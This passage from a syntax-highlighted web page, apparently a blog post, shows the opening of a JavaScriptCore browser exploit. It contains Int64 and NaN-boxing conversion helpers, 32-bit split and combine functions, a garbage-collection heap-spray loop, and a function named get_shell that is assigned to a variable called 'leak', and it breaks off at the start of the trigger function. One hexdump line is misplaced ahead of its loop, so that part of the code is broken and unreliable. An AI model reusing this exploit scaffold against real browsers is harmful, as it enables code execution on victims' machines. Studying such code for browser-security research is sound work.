class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="built_in">String</span>.prototype.padLeft =</span></span><br><span class="line"><span class="javascript"><span class="built_in">Number</span>.prototype.padLeft = <span class="function"><span class="keyword">function</span>(<span class="params">total, pad</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">return</span> (<span class="built_in">Array</span>(total).join(pad || <span class="number">0</span>) + <span class="keyword">this</span>).slice(-total);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">// Return the hexadecimal representation of the given byte array.</span></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">hexlify</span>(<span class="params">bytes</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> res = [];</span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; bytes.length; i++)&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//console.log(bytes[i].toString(16));</span></span></span><br><span class="line"><span class="javascript">        res.push((<span class="string">'0'</span> + bytes[i].toString(<span class="number">16</span>)).substr(<span class="number">-2</span>));</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> res.join(<span class="string">''</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">// Return the binary data represented by the given hexdecimal string.</span></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">unhexlify</span>(<span class="params">hexstr</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (hexstr.length % <span class="number">2</span> == <span class="number">1</span>)</span></span><br><span class="line"><span class="javascript">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">"Invalid hex string"</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(hexstr.length / <span class="number">2</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; hexstr.length; i += <span class="number">2</span>)</span></span><br><span class="line"><span class="javascript">        bytes[i/<span class="number">2</span>] = <span class="built_in">parseInt</span>(hexstr.substr(i, <span class="number">2</span>), <span class="number">16</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> bytes;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">hexdump</span>(<span class="params">data</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (<span class="keyword">typeof</span> data.BYTES_PER_ELEMENT !== <span class="string">'undefined'</span>)</span></span><br><span class="line"><span class="javascript">        data = <span class="built_in">Array</span>.from(data);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> lines = [];</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> chunk = data.slice(i, i+<span class="number">16</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; data.length; i += <span class="number">16</span>) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> parts = chunk.map(hex);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (parts.length &gt; <span class="number">8</span>)</span></span><br><span class="line"><span class="javascript">            parts.splice(<span class="number">8</span>, <span class="number">0</span>, <span class="string">' '</span>);</span></span><br><span class="line"><span class="javascript">        lines.push(parts.join(<span class="string">' '</span>));</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> lines.join(<span class="string">'\n'</span>);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">// Simplified version of the similarly named python module.</span></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> Struct = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// Allocate these once to avoid unecessary heap allocations during pack/unpack operations.</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> buffer      = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> byteView    = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buffer);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> uint32View  = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(buffer);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> float64View = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buffer);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> &#123;</span></span><br><span class="line"><span class="javascript">        pack: <span class="function"><span class="keyword">function</span>(<span class="params">type, value</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> view = type;        <span class="comment">// See below</span></span></span><br><span class="line"><span class="undefined">            view[0] = value;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buffer, <span class="number">0</span>, type.BYTES_PER_ELEMENT);</span></span><br><span class="line"><span class="undefined">        &#125;,</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        unpack: <span class="function"><span class="keyword">function</span>(<span class="params">type, bytes</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (bytes.length !== type.BYTES_PER_ELEMENT)</span></span><br><span class="line"><span class="javascript">                <span class="keyword">throw</span> <span class="built_in">Error</span>(<span class="string">"Invalid bytearray"</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> view = type;        <span class="comment">// See below</span></span></span><br><span class="line"><span class="undefined">            byteView.set(bytes);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> view[<span class="number">0</span>];</span></span><br><span class="line"><span class="undefined">        &#125;,</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="comment">// Available types.</span></span></span><br><span class="line"><span class="undefined">        int8:    byteView,</span></span><br><span class="line"><span class="undefined">        int32:   uint32View,</span></span><br><span class="line"><span class="undefined">        float64: float64View</span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="undefined">&#125;)();</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">Int64</span>(<span class="params">v</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// The underlying byte array.</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> bytes = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(<span class="number">8</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">switch</span> (<span class="keyword">typeof</span> v) &#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">case</span> <span class="string">'number'</span>:</span></span><br><span class="line"><span class="javascript">            v = <span class="string">'0x'</span> + <span class="built_in">Math</span>.floor(v).toString(<span class="number">16</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">case</span> <span class="string">'string'</span>:</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (v.startsWith(<span class="string">'0x'</span>))</span></span><br><span class="line"><span class="undefined">                v = v.substr(2);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (v.length % <span class="number">2</span> == <span class="number">1</span>)</span></span><br><span class="line"><span class="javascript">                v = <span class="string">'0'</span> + v;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> bigEndian = unhexlify(v, <span class="number">8</span>);</span></span><br><span class="line"><span class="javascript">            <span class="comment">//console.log(bigEndian.toString());</span></span></span><br><span class="line"><span class="javascript">            bytes.set(<span class="built_in">Array</span>.from(bigEndian).reverse());</span></span><br><span class="line"><span class="javascript">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">case</span> <span class="string">'object'</span>:</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (v <span class="keyword">instanceof</span> Int64) &#123;</span></span><br><span class="line"><span class="undefined">                bytes.set(v.bytes());</span></span><br><span class="line"><span class="javascript">            &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (v.length != <span class="number">8</span>)</span></span><br><span class="line"><span class="javascript">                    <span class="keyword">throw</span> <span class="built_in">TypeError</span>(<span class="string">"Array must have excactly 8 elements."</span>);</span></span><br><span class="line"><span class="undefined">                bytes.set(v);</span></span><br><span class="line"><span class="undefined">            &#125;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">case</span> <span class="string">'undefined'</span>:</span></span><br><span class="line"><span class="javascript">            <span class="keyword">break</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">default</span>:</span></span><br><span class="line"><span class="javascript">            <span class="keyword">throw</span> <span class="built_in">TypeError</span>(<span class="string">"Int64 constructor requires an argument."</span>);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// Return a double whith the same underlying bit representation.</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">this</span>.asDouble = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// Check for NaN</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (bytes[<span class="number">7</span>] == <span class="number">0xff</span> &amp;&amp; (bytes[<span class="number">6</span>] == <span class="number">0xff</span> || bytes[<span class="number">6</span>] == <span class="number">0xfe</span>))</span></span><br><span class="line"><span class="javascript">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RangeError</span>(<span class="string">"Integer can not be represented by a double"</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> Struct.unpack(Struct.float64, bytes);</span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// Return a javascript value with the same underlying bit representation.</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// due to double conversion constraints.</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">this</span>.asJSValue = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> ((bytes[<span class="number">7</span>] == <span class="number">0</span> &amp;&amp; bytes[<span class="number">6</span>] == <span class="number">0</span>) || (bytes[<span class="number">7</span>] == <span class="number">0xff</span> &amp;&amp; bytes[<span class="number">6</span>] == <span class="number">0xff</span>))</span></span><br><span class="line"><span class="javascript">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">RangeError</span>(<span class="string">"Integer can not be represented by a JSValue"</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="comment">// For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">this</span>.assignSub(<span class="keyword">this</span>, <span class="number">0x1000000000000</span>);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> res = Struct.unpack(Struct.float64, bytes);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">this</span>.assignAdd(<span class="keyword">this</span>, <span class="number">0x1000000000000</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> res;</span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// Return the underlying bytes of this number as array.</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">this</span>.bytes = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="built_in">Array</span>.from(bytes);</span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// Return the byte at the given index.</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">this</span>.byteAt = <span class="function"><span class="keyword">function</span>(<span class="params">i</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> bytes[i];</span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// Return the value of this number as unsigned hex string.</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">this</span>.toString = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//console.log("toString");</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="string">'0x'</span> + hexlify(<span class="built_in">Array</span>.from(bytes).reverse());</span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// Basic arithmetic.</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// These functions assign the result of the computation to their 'this' object.</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// Decorator for Int64 instance operations. Takes care</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">// of converting arguments to Int64 instances if required.</span></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">operation</span>(<span class="params">f, nargs</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">if</span> (<span class="built_in">arguments</span>.length != nargs)</span></span><br><span class="line"><span class="javascript">                <span class="keyword">throw</span> <span class="built_in">Error</span>(<span class="string">"Not enough arguments for function "</span> + f.name);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="built_in">arguments</span>.length; i++)</span></span><br><span class="line"><span class="javascript">                <span class="keyword">if</span> (!(<span class="built_in">arguments</span>[i] <span class="keyword">instanceof</span> Int64))</span></span><br><span class="line"><span class="javascript">                    <span class="built_in">arguments</span>[i] = <span class="keyword">new</span> Int64(<span class="built_in">arguments</span>[i]);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> f.apply(<span class="keyword">this</span>, <span class="built_in">arguments</span>);</span></span><br><span class="line"><span class="undefined">        &#125;;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// this = -n (two's complement)</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">this</span>.assignNeg = operation(<span class="function"><span class="keyword">function</span> <span class="title">neg</span>(<span class="params">n</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span></span><br><span class="line"><span class="undefined">            bytes[i] = ~n.byteAt(i);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="keyword">this</span>.assignAdd(<span class="keyword">this</span>, Int64.One);</span></span><br><span class="line"><span class="undefined">    &#125;, 1);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// this = a + b</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">this</span>.assignAdd = operation(<span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a, b</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> carry = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cur = a.byteAt(i) + b.byteAt(i) + carry;</span></span><br><span class="line"><span class="undefined">            carry = cur &gt; 0xff | 0;</span></span><br><span class="line"><span class="undefined">            bytes[i] = cur;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="keyword">this</span>;</span></span><br><span class="line"><span class="undefined">    &#125;, 2);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// this = a - b</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">this</span>.assignSub = operation(<span class="function"><span class="keyword">function</span> <span class="title">sub</span>(<span class="params">a, b</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> carry = <span class="number">0</span>;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> cur = a.byteAt(i) - b.byteAt(i) - carry;</span></span><br><span class="line"><span class="undefined">            carry = cur &lt; 0 | 0;</span></span><br><span class="line"><span class="undefined">            bytes[i] = cur;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="keyword">this</span>;</span></span><br><span class="line"><span class="undefined">    &#125;, 2);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// this = a &amp; b</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">this</span>.assignAnd = operation(<span class="function"><span class="keyword">function</span> <span class="title">and</span>(<span class="params">a, b</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span></span><br><span class="line"><span class="undefined">            bytes[i] = a.byteAt(i) &amp; b.byteAt(i);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="keyword">this</span>;</span></span><br><span class="line"><span class="undefined">    &#125;, 2);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">// Constructs a new Int64 instance with the same bit representation as the provided double.</span></span></span><br><span class="line"><span class="javascript">Int64.fromDouble = <span class="function"><span class="keyword">function</span>(<span class="params">d</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> bytes = Struct.pack(Struct.float64, d);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="keyword">new</span> Int64(bytes);</span></span><br><span class="line"><span class="undefined">&#125;;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">// Convenience functions. These allocate a new Int64 to hold the result.</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">// Return -n (two's complement)</span></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">Neg</span>(<span class="params">n</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignNeg(n);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">// Return a + b</span></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">Add</span>(<span class="params">a, b</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignAdd(a, b);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">// Return a - b</span></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">Sub</span>(<span class="params">a, b</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignSub(a, b);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">// Return a &amp; b</span></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">And</span>(<span class="params">a, b</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> (<span class="keyword">new</span> Int64()).assignAnd(a, b);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">a</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (a == <span class="literal">undefined</span>) <span class="keyword">return</span> <span class="string">"0xUNDEFINED"</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> ret = a.toString(<span class="number">16</span>);</span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (ret.substr(<span class="number">0</span>,<span class="number">2</span>) != <span class="string">"0x"</span>) <span class="keyword">return</span> <span class="string">"0x"</span>+ret;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">else</span> <span class="keyword">return</span> ret;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">lower</span>(<span class="params">x</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// returns the lower 32bit of double x</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((<span class="string">"0000000000000000"</span> + Int64.fromDouble(x).toString()).substr(<span class="number">-8</span>,<span class="number">8</span>),<span class="number">16</span>) | <span class="number">0</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">upper</span>(<span class="params">x</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// returns the upper 32bit of double x</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((<span class="string">"0000000000000000"</span> + Int64.fromDouble(x).toString()).substr(<span class="number">-16</span>, <span class="number">8</span>),<span class="number">16</span>) | <span class="number">0</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">lowerint</span>(<span class="params">x</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// returns the lower 32bit of int x</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((<span class="string">"0000000000000000"</span> + x.toString(<span class="number">16</span>)).substr(<span class="number">-8</span>,<span class="number">8</span>),<span class="number">16</span>) | <span class="number">0</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">upperint</span>(<span class="params">x</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// returns the upper 32bit of int x</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((<span class="string">"0000000000000000"</span> + x.toString(<span class="number">16</span>)).substr(<span class="number">-16</span>, <span class="number">8</span>),<span class="number">16</span>) | <span class="number">0</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">combine</span>(<span class="params">a, b</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//a = a &gt;&gt;&gt; 0;</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//b = b &gt;&gt;&gt; 0;</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//console.log(a.toString());</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//console.log(b.toString());</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="built_in">parseInt</span>(Int64.fromDouble(b).toString() + Int64.fromDouble(a).toString(), <span class="number">16</span>);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="comment">//padLeft用于字符串左补位</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">combineint</span>(<span class="params">a, b</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">//a = a &gt;&gt;&gt; 0;</span></span></span><br><span class="line"><span class="javascript">    <span class="comment">//b = b &gt;&gt;&gt; 0;</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="built_in">parseInt</span>(b.toString(<span class="number">16</span>).substr(<span class="number">-8</span>,<span class="number">8</span>) + (a.toString(<span class="number">16</span>)).padLeft(<span class="number">8</span>), <span class="number">16</span>);</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">gc</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">1024</span> * <span class="number">1024</span> * <span class="number">16</span>; i++)&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">new</span> <span class="built_in">String</span>();</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">clear_space</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="undefined">  gc();</span></span><br><span class="line"><span class="undefined">  gc();</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">get_shell</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">return</span> <span class="number">1</span> + <span class="number">1</span>;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> leak = get_shell;</span></span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">fun</span>(<span class="params">arg</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> x = <span 